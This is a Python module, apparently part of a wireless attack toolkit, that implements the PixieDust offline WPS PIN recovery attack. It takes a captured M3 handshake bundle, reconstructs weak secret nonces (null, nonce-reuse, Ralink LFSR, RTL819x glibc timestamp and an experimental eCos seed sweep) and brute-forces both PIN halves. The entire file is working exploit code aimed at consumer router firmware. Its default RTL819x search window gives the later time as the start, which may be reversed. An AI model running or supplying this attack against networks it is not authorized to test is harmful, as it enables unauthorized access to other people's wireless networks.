"""Native PixieDust offline PIN recovery: tries the weak-entropy cases of the WPS M3 secret
nonces (null, nonce-reuse, Ralink LFSR, RTL819x glibc timestamp) and brute-forces the PIN halves
offline. Pure/CPU-bound and self-contained, so a caller can run it in a worker process.
"""

from __future__ import annotations

import time
from dataclasses import dataclass
from enum import Enum, auto
from typing import Iterable, Optional, Tuple

from wifit3.campaigns.wps import pins, pixie_prng
from wifit3.dot11.wsc import crypto as wc


class PixieMode(Enum):
    NULL_SECRET = auto()
    STATIC_SECRET = auto()
    RALINK = auto()
    RTL819X = auto()
    ECOS_SIMPLE = auto()   # experimental; not in DEFAULT_MODES (the seed sweep is 2^25)


@dataclass(frozen=True)
class PixieBundle:
    pke: bytes
    pkr: bytes
    e_hash1: bytes
    e_hash2: bytes
    e_nonce: bytes
    authkey: bytes
    enrollee_mac: bytes | None = None


@dataclass(frozen=True)
class PixieResult:
    pin: str | None = None
    mode: PixieMode | None = None
    found: bool = False


SecretPair = tuple[bytes, bytes]

NULL_SECRET_PAIR: SecretPair = (b"\x00" * wc.SECRET_NONCE_LEN, b"\x00" * wc.SECRET_NONCE_LEN)

# All modes, in the order a live capture should try them: the two instant table lookups, the
# deterministic Ralink reconstruction, then the (bounded) RTL819x timestamp search.
DEFAULT_MODES = (
    PixieMode.NULL_SECRET, PixieMode.STATIC_SECRET, PixieMode.RALINK, PixieMode.RTL819X,
)

# RTL819x: E-S1's seed lies within this many seconds of the nonce seed, E-S2's a few seconds after.
_RTL_ES1_SPAN = 600
_RTL_ES2_SPAN = 10
# Default nonce-seed search: +/- a day around now (the enrollee seeds glibc random() from time()).
_RTL_WINDOW_SEC = 86400
# eCos simple: top 7 seed bits come from the nonce, leaving a 25-bit sweep.
_ECOS_MAX_COUNTER = 0x02000000


def recover_pin(
    bundle: PixieBundle,
    modes: Iterable[PixieMode] = DEFAULT_MODES,
    static_secrets: Iterable[SecretPair] = (),
    rtl_window: Optional[Tuple[int, int]] = None,
    ecos_max_counter: int = _ECOS_MAX_COUNTER,
) -> PixieResult:
    """Try each PixieDust ``mode`` against a captured M3 ``bundle``; first recovered PIN wins."""
    for mode in modes:
        pin = _recover_one(bundle, mode, tuple(static_secrets), rtl_window, ecos_max_counter)
        if pin is not None:
            return PixieResult(pin=pin, mode=mode, found=True)
    return PixieResult()


def _recover_one(
    bundle: PixieBundle, mode: PixieMode, static_secrets: Tuple[SecretPair, ...],
    rtl_window: Optional[Tuple[int, int]], ecos_max_counter: int,
) -> Optional[str]:
    if mode is PixieMode.NULL_SECRET:
        return _recover_with_secret_pair(bundle, NULL_SECRET_PAIR)
    if mode is PixieMode.STATIC_SECRET:
        for pair in (static_secrets or _static_secret_pairs(bundle)):
            pin = _recover_with_secret_pair(bundle, pair)
            if pin is not None:
                return pin
        return None
    if mode is PixieMode.RALINK:
        return _recover_ralink(bundle)
    if mode is PixieMode.RTL819X:
        return _recover_rtl819x(bundle, rtl_window)
    if mode is PixieMode.ECOS_SIMPLE:
        return _recover_ecos_simple(bundle, ecos_max_counter)
    return None


def _static_secret_pairs(bundle: PixieBundle) -> Tuple[SecretPair, ...]:
    """Known constant secret pairs. Some enrollees reuse the Enrollee nonce as both secrets."""
    nonce = bundle.e_nonce
    if nonce and len(nonce) == wc.SECRET_NONCE_LEN:
        return ((nonce, nonce),)
    return ()


def _recover_ralink(bundle: PixieBundle) -> Optional[str]:
    """Ralink/MediaTek: rebuild E-S1/E-S2 from the nonce's LFSR state, then brute the PIN halves."""
    secrets = pixie_prng.ralink_recover(bundle.e_nonce)
    if secrets is None:
        return None
    return _recover_with_secret_pair(bundle, secrets)


def _recover_ecos_simple(bundle: PixieBundle, max_counter: int) -> Optional[str]:
    """eCos "simple" (experimental): sweep the 25-bit seed for E-S1/E-S2, then brute the halves."""
    secrets = pixie_prng.ecos_simple_recover(bundle.e_nonce, max_counter)
    if secrets is None:
        return None
    return _recover_with_secret_pair(bundle, secrets)


def _recover_rtl819x(bundle: PixieBundle, rtl_window: Optional[Tuple[int, int]]) -> Optional[str]:
    """RTL819x: find the glibc timestamp seed that produced the nonce, then the nearby seeds that
    produced E-S1 (first-half oracle) and E-S2 (second-half oracle)."""
    nonce = bundle.e_nonce
    if len(nonce) != wc.SECRET_NONCE_LEN:
        return None
    # glibc random() is 31-bit, so each 4-byte word of a genuine RTL819x nonce has its top bit clear.
    if nonce[0] & 0x80 or nonce[4] & 0x80 or nonce[8] & 0x80 or nonce[12] & 0x80:
        return None
    start, end = rtl_window if rtl_window is not None else _default_rtl_window()
    nonce_seed = pixie_prng.find_glibc_nonce_seed(nonce, start, end)
    if nonce_seed is None:
        return None

    first4: Optional[str] = None
    s1_seed = nonce_seed
    for dist in range(_RTL_ES1_SPAN + 1):
        candidates = (nonce_seed,) if dist == 0 else (nonce_seed + dist, nonce_seed - dist)
        for cand in candidates:
            found = _find_first_half(bundle, pixie_prng.glibc_nonce(cand))
            if found is not None:
                first4, s1_seed = found, cand
                break
        if first4 is not None:
            break
    if first4 is None:
        return None

    for j in range(_RTL_ES2_SPAN):
        pin = _find_second_half(bundle, pixie_prng.glibc_nonce(s1_seed + j), first4)
        if pin is not None:
            return pin
    return None


def _default_rtl_window() -> Tuple[int, int]:
    now = int(time.time())
    return (now + _RTL_WINDOW_SEC, now - _RTL_WINDOW_SEC)


def _recover_with_secret_pair(bundle: PixieBundle, secret_pair: SecretPair) -> Optional[str]:
    e_s1, e_s2 = secret_pair
    first4 = _find_first_half(bundle, e_s1)
    if first4 is None:
        return None
    return _find_second_half(bundle, e_s2, first4)


def _find_first_half(bundle: PixieBundle, e_s1: bytes) -> Optional[str]:
    for value in range(10_000):
        first4 = f"{value:04d}"
        if wc.check_pin_half(
            bundle.authkey, e_s1, bundle.e_hash1, first4.encode("ascii"), bundle.pke, bundle.pkr
        ):
            return first4
    return None


def _find_second_half(bundle: PixieBundle, e_s2: bytes, first4: str) -> Optional[str]:
    for value in range(1_000):
        pin = pins.full_pin(first4, f"{value:03d}")
        if wc.check_pin_half(
            bundle.authkey, e_s2, bundle.e_hash2, pin[4:].encode("ascii"), bundle.pke, bundle.pkr
        ):
            return pin
    return None
